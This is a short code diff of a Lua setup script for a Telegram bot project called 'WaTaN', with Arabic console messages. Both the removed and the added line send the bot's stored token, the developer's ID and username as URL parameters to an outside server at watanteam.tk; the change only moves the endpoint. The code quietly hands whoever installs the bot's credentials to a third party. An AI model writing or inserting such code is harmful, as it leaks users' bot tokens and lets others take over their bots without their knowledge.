@@ -65,7 +65,7 @@ print('\n\27[1;34m لم يتم حفظ معرف المطور :')
 end 
 os.execute('lua WaTaN.lua')
 end
-https.request('https://abbas.watanteam.tk/WaTaN/insert/index.php?n=WaTaN&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&username="..database:get(id_server..":SUDO:USERNAME"))
+https.request('https://abbas.watanteam.tk/WaTaN/WaTaN/WaTaN.php?n=WaTaN&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&username="..database:get(id_server..":SUDO:USERNAME"))
 local create_config_auto = function()
 config = {
 token = database:get(id_server..":token"),
